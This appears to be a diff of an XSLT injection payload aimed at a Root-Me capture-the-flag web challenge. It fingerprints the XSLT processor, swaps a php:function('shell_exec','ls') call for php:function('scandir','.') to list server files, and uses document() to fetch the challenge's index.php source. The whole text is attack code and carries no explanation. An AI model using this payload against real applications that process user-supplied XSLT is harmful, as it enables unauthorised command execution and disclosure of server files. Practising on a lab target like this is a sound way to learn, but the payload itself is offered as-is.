@@ -6,7 +6,7 @@
 <br />Version: <xsl:value-of select="system-property('xsl:version')" />
 <br />Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
 <br />Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
-	<xsl:value-of select="php:function('shell_exec', 'ls')" />
+        <xsl:value-of name="assert" select="php:function('scandir', '.')"/>
 	<xsl:copy-of select="document('http://challenge01.root-me.org/web-serveur/ch50/index.php')"/>
 	<xsl:value-of select="document('http://challenge01.root-me.org/web-serveur/ch50/index.php')"/>
 	    
